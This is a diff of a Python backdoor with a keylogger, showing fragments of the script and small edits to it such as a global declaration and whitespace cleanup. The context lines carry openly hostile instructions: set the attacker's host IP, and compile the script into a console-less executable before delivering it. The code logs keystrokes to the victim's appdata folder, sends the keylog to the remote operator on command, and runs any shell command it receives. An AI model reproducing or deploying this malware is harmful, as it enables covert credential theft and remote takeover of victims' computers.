@@ -10,9 +10,7 @@ import threading
 import pynput.keyboard
 #[!!!!!!!!!!!!!!!] WARNING change it to your own ip host(attacker) and uncomment it
 host_ip = "127.0.0.1" 
-
 #first before deliver make it exe or linux executable file using pyinstaller --onefile --noconsole backdoor.py
-
 
 keys = ""
 path = os.environ["appdata"]+"\\keylogger.txt"
@@ -52,8 +50,6 @@ def start_keylogger():
 	with keyboard_listener:
 		report()
 		keyboard_listener.join()
-
-
 
 def reliable_send(data):
 	if type(data) == bytes:
@@ -163,12 +159,14 @@ def shell():
 				reliable_send("Cant perform the Check")
 
 		elif command[:12] == "keylog_start":
+			global t1
 			t1 = threading.Thread(target=start_keylogger)
 			t1.start()
+			print()
 
 		elif command[:11] == "keylog_dump":
 			fn = open(path, "r")
-			reliable_send(fn.read())		
+			reliable_send(fn.read())
 
 		else:	
 			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
